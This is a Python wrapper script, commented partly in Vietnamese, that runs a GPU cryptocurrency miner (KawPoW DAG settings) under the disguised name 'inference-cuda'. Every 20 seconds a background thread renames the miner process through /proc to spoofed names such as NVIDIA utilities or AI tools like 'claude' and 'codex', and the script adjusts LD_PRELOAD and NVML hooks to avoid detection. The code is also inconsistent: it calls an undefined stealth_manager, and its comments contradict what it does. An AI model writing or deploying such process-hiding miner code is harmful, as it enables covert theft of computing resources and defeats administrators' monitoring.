#!/usr/bin/env python3
"""mining_environment.stealth.wrappers.stealth_inference_cuda

🎮 **[Stealth GPU-CUDA Inference Wrapper]** (wrapper ẩn danh cho GPU-CUDA inference)

Script wrapper khởi động **inference-cuda process** với **[Self-Stealth capability]** (khả năng tự ẩn danh).
Giải quyết vấn đề **[GPU Process Exposure]** (tiến trình GPU bị lộ) bằng cách áp dụng 
**[Process Name Spoofing]** (giả mạo tên tiến trình) tương tự CPU mining.

⚠️ WORKFLOW:
1. Khởi động **[Self-Stealth Manager]** trong process hiện tại
2. Thay đổi process name thành system process giả (GPU-optimized names)
3. Exec **inference-cuda** binary để thay thế process image
4. **Self-Stealth Manager** tiếp tục hoạt động trong inference-cuda process

✅ ADVANTAGES:
- Symmetric protection với CPU mining
- Không cần external PID tracking
- Không cần special privileges  
- Process tự quản lý stealth mode
- Zero GPU mining interruption risk

🎯 GPU-SPECIFIC FEATURES:
- GPU-optimized stealth names (CUDA, OpenGL, graphics processes)
- Compatible với CUDA runtime
- Handles GPU driver process signatures
"""

import os
import sys
import signal
import time
import subprocess
import threading
import random
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging với GPU-specific logger name
logger = get_unified_logger('mining_environment.gpu_stealth')

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi GPU process bị terminate.
    """
    logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
    
    # Self-stealth functionality removed - no cleanup needed
    logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleanup completed")
    
    sys.exit(0)

def create_enhanced_gpu_environment():
    """
    **[Enhanced GPU Environment Creator]** (tạo môi trường GPU tối ưu)
    
    Tái sử dụng patterns từ existing modules để tạo clean environment
    cho GPU subprocess với enhanced resource management.
    
    Returns:
        dict: Clean environment dictionary for GPU subprocess
    """
    logger.info("🔧 [GPU-ENV-OPTIMIZER] Creating enhanced GPU environment using existing patterns")
    
    # Base environment copy
    clean_env = os.environ.copy()
    
    # 1. LD_PRELOAD Management - Tương tự thermal_spoofer.py approach
    if 'LD_PRELOAD' in clean_env:
        preload_libs = clean_env['LD_PRELOAD'].split(':')
        # Keep thermal hooks, remove GPU interference hooks
        filtered_libs = [lib for lib in preload_libs if 'libgpuhook.so' not in lib]
        
        if filtered_libs:
            clean_env['LD_PRELOAD'] = ':'.join(filtered_libs)
            logger.info(f"🔧 [GPU-ENV-OPTIMIZER] Filtered LD_PRELOAD: {clean_env['LD_PRELOAD']}")
        else:
            del clean_env['LD_PRELOAD']
            logger.info("🔧 [GPU-ENV-OPTIMIZER] Removed LD_PRELOAD completely")
    
    # 2. NVML Management - Based on nvml_interceptor.py patterns
    clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
    clean_env['GPU_MINING_SUBPROCESS'] = '1'
    
    # 3. CUDA Resource Optimization - Inspired by resource_control.py
    cuda_optimizations = {
        'CUDA_LAUNCH_TIMEOUT': '30',
        'CUDA_DEVICE_MAX_CONNECTIONS': '1',
        # CUDA_VISIBLE_DEVICES removed - let CUDA runtime auto-detect all GPUs
        'CUDA_CACHE_DISABLE': '1',
        'NVIDIA_DRIVER_CAPABILITIES': 'compute',
        # Additional GPU-specific optimizations
        'CUDA_FORCE_PTX_JIT': '1',          # Force JIT compilation for stability
        'CUDA_DISABLE_CUBLASLT': '1',       # Disable problematic cuBLAS components
        'CUDA_MODULE_LOADING': 'LAZY'       # Lazy loading to reduce memory pressure
    }
    
    for key, value in cuda_optimizations.items():
        clean_env[key] = value
    
    logger.info(f"✅ [GPU-ENV-OPTIMIZER] Applied {len(cuda_optimizations)} CUDA optimizations")
    return clean_env

def main():
    """
    **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
    """
    try:
        logger.info("🚀 [GPU-STEALTH-WRAPPER] Starting Stealth GPU-CUDA Inference Wrapper")
        
        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        
        # Parse command line arguments (forward tất cả args to inference-cuda)
        cuda_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")
        
        # ✅ OPTIMIZED: Use enhanced GPU environment creator - Tái sử dụng existing patterns
        clean_env = create_enhanced_gpu_environment()

        # Get inference-cuda binary path from environment
        cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
        if not os.path.exists(cuda_inference_path):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not found: {cuda_inference_path}")
            sys.exit(1)
        
        # Verify binary is executable
        if not os.access(cuda_inference_path, os.X_OK):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not executable: {cuda_inference_path}")
            sys.exit(1)
        
        logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")
        
        # Self-stealth functionality removed - process renaming now handled by child process management
        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")
        
        # Small delay để đảm bảo process ready
        time.sleep(1)
        
        # Prepare command để exec inference-cuda
        exec_command = [cuda_inference_path] + cuda_inference_args
        logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
        
        # 🚀 PHASE 2: GPU Post-Exec Stealth Implementation  
        # Use subprocess instead of execv() to maintain GPU stealth control
        logger.info("🔄 [GPU-POST-EXEC-STEALTH] Using subprocess mode to maintain GPU stealth control")
        
        try:
            # Memory optimization trước khi start inference-cuda 
            logger.info("🧠 [MEMORY-OPT] Pre-execution memory optimization...")
            
            # Set DAG generation memory limits
            clean_env['CUDA_LAUNCH_BLOCKING'] = '1'  # Synchronous CUDA calls
            clean_env['CUDA_CACHE_DISABLE'] = '1'    # Disable CUDA cache during DAG gen
            clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'  # Limit concurrent connections
            
            # Progressive memory allocation cho DAG – CHỈ đặt nếu người dùng chưa override
            clean_env.setdefault('KAWPOW_DAG_PROGRESSIVE', '1')  # Enable progressive DAG loading mặc định
            # Nếu người dùng định nghĩa KAWPOW_DAG_MEMORY_LIMIT thì áp dụng, ngược lại giữ cơ chế auto-detect của miner
            if 'KAWPOW_DAG_MEMORY_LIMIT' in os.environ:
                clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
            
            logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")
            
            # Start inference-cuda as subprocess
            # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
            process = subprocess.Popen(
                exec_command,
                env=clean_env  # Use clean environment for subprocess ONLY
                # stdout and stderr will inherit parent's pipes for logging
            )
            logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
            # ---- New: Rename child PID and register to DirectPIDRegistry ----
            try:
                stealth_names = [
                    "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
                    "nvidiasettings", "gpumanager", "glxgears",
                    "vulkaninfo", "mesaloader", "drmtip",
                    "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
                    "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
                    "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
                ]
                new_name = random.choice(stealth_names)[:15]
                # /proc/<pid>/comm expects <=15 bytes, no newline
                safe_name = new_name.encode("utf-8")[:15].decode("utf-8", errors="ignore")
                # Retry loop: rename may fail immediately after exec; wait then retry
                rename_success = False
                for attempt in range(5):  # max 5 retries within ~2s
                    try:
                        comm_path = f"/proc/{process.pid}/comm"
                        bname = safe_name.encode("utf-8")
                        try:
                            fd = os.open(comm_path, os.O_WRONLY)
                            os.write(fd, bname)
                            os.close(fd)
                        except OSError as e:
                            if e.errno == 22 and len(bname) < 15:
                                # Một số kernel yêu cầu ký tự newline kết thúc
                                fd = os.open(comm_path, os.O_WRONLY)
                                os.write(fd, bname + b"\n")
                                os.close(fd)
                            else:
                                raise
                        rename_success = True
                        break
                    except OSError as os_err:
                        if os_err.errno == 22:  # EINVAL – likely exec replacing process
                            time.sleep(0.4)
                            continue
                        else:
                            raise
                if not rename_success:
                    logger.warning(
                        f"⚠️ [GPU-POST-EXEC-STEALTH] Initial rename attempts failed for PID {process.pid}. "
                        "Will continue trying in background thread."
                    )
                    # Spawn background thread to keep attempting rename until success
                    def _retry_rename():
                        attempt_delay = 1.0  # seconds
                        max_bg_attempts = 20
                        for bg_attempt in range(max_bg_attempts):
                            try:
                                time.sleep(attempt_delay)
                                comm_path = f"/proc/{process.pid}/comm"
                                bname_local = safe_name.encode("utf-8")
                                fd_local = os.open(comm_path, os.O_WRONLY)
                                os.write(fd_local, bname_local)
                                os.close(fd_local)
                                logger.info(
                                    f"✅ [GPU-POST-EXEC-STEALTH] Background rename succeeded on attempt {bg_attempt+1} "
                                    f"for PID {process.pid} -> '{new_name}'"
                                )
                                return
                            except OSError as bg_err:
                                if bg_err.errno == 22:
                                    continue  # keep retrying
                                else:
                                    logger.error(
                                        f"❌ [GPU-POST-EXEC-STEALTH] Background rename failed with unexpected error: {bg_err}"
                                    )
                                    return
                        logger.error(
                            f"❌ [GPU-POST-EXEC-STEALTH] Unable to rename PID {process.pid} after background retries"
                        )
                    threading.Thread(target=_retry_rename, daemon=True).start()
                else:
                    logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
                # Sau khi khởi động process con (mining binary):
                time.sleep(3)  # Đảm bảo tiến trình mining đã cấp phát xong bộ nhớ lớn
                # Đổi tên process như cũ
                # 🚀 **DIRECT REGISTRY REGISTRATION** (đăng ký registry trực tiếp) - THAY THẾ EVENTBUS
                try:
                    # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
                    # FIX: Remove duplicate sys import to prevent variable shadowing
                    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..'))
                    from pid_logger.direct_registry import get_direct_registry
                    
                    # **Direct process registration** (đăng ký tiến trình trực tiếp) with metadata
                    registry = get_direct_registry()
                    process_metadata = {
                        'stealth_name': new_name,
                        'role': 'real',
                        'timestamp': time.time(),
                        'wrapper_pid': os.getpid(),  # PID của stealth wrapper
                        'stealth_enabled': True,
                        'registration_source': 'stealth_inference_cuda'
                    }
                    
                    # **CORE REPLACEMENT**: Direct registry call completely replaces EventBus publish
                    success = registry.register_process(
                        pid=process.pid,
                        process_type="gpu", 
                        process_obj=process,
                        process_name=new_name,
                        metadata=process_metadata
                    )
                    
                    if success:
                        logger.info(f"✅ [DIRECT-REGISTRY] Successfully registered GPU process: PID={process.pid}, Name={new_name}")
                        logger.info(f"📊 [DIRECT-REGISTRY] Registration triggered immediate plugin notifications")
                    else:
                        logger.error(f"❌ [DIRECT-REGISTRY] Failed to register GPU process PID {process.pid}")
                        
                except Exception as registry_err:
                    logger.error(f"❌ [DIRECT-REGISTRY] Registration failed: {registry_err}")
                    # **Fallback**: Vẫn tiếp tục chạy process nếu registry fail
                    logger.warning(f"⚠️ [DIRECT-REGISTRY] Process will continue without registry - plugins may not activate")
            except Exception as rename_err:
                logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
            
            # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
            def maintain_gpu_subprocess_stealth():
                """Enhanced GPU monitoring với resource conflict detection"""
                # Reuse same stealth_names list to ensure consistency
                gpu_stealth_names = stealth_names
                
                resource_error_count = 0  # Track consecutive errors
                max_errors = 3           # Threshold để emergency handling
                
                while process.poll() is None:  # While process is running
                    try:
                        time.sleep(20)  # GPU-specific interval
                        if process.poll() is None:  # Check again after sleep
                            
                            # Enhanced Resource Health Check - Tương tự resource_control.py monitoring
                            try:
                                # Check if process is responsive (not in D state)
                                with open(f"/proc/{process.pid}/stat", "r") as f:
                                    stat_data = f.read().split()
                                    process_state = stat_data[2] if len(stat_data) > 2 else "?"
                                
                                if process_state == "D":  # Uninterruptible sleep - resource problem
                                    resource_error_count += 1
                                    logger.warning(f"⚠️ [GPU-RESOURCE-MONITOR] Process in uninterruptible sleep (D state). Error count: {resource_error_count}")
                                    
                                    if resource_error_count >= max_errors:
                                        logger.error(f"🚨 [GPU-RESOURCE-MONITOR] Max resource errors reached. Process may need restart.")
                                        # Log for mining_environment analysis
                                        break
                                else:
                                    resource_error_count = 0  # Reset counter on healthy state
                                    
                            except Exception as stat_error:
                                logger.debug(f"⚠️ [GPU-RESOURCE-MONITOR] Could not read process stats: {stat_error}")
                            
                            # Apply GPU stealth to subprocess
                            gpu_stealth_name = random.choice(gpu_stealth_names)
                            
                            # Try to change subprocess name via /proc/comm
                            try:
                                with open(f"/proc/{process.pid}/comm", "w") as f:
                                    f.write(gpu_stealth_name[:15])
                                logger.debug(f"🔄 [GPU-POST-EXEC-STEALTH] GPU Subprocess PID {process.pid} renamed to: {gpu_stealth_name}")
                            except Exception as comm_error:
                                logger.debug(f"⚠️ [GPU-POST-EXEC-STEALTH] Could not rename GPU subprocess: {comm_error}")
                                
                    except Exception as e:
                        logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
                        break
                        
                logger.info("🔚 [GPU-POST-EXEC-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
            
            # Start GPU stealth maintenance thread
            gpu_stealth_thread = threading.Thread(target=maintain_gpu_subprocess_stealth, daemon=True)
            gpu_stealth_thread.start()
            
            # Wait for subprocess to complete
            return_code = process.wait()
            logger.info(f"🔚 [GPU-POST-EXEC-STEALTH] inference-cuda subprocess completed with code: {return_code}")
            
            # Cleanup
            stealth_manager.stop_stealth_mode()
            sys.exit(return_code)
            
        except Exception as e:
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [GPU-STEALTH-WRAPPER] Falling back to subprocess mode")
            
            try:
                # Run inference-cuda as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=sys.stdout,
                    stderr=sys.stderr,
                    env=clean_env  # Use clean environment for fallback subprocess too
                )
                
                logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")
                
                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [GPU-STEALTH-WRAPPER] inference-cuda subprocess completed with code: {return_code}")
                
                # Cleanup stealth mode
                stealth_manager.stop_stealth_mode()
                sys.exit(return_code)
                
            except Exception as subprocess_error:
                logger.error(f"❌ [GPU-STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                stealth_manager.stop_stealth_mode()
                sys.exit(1)
    
    except Exception as e:
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()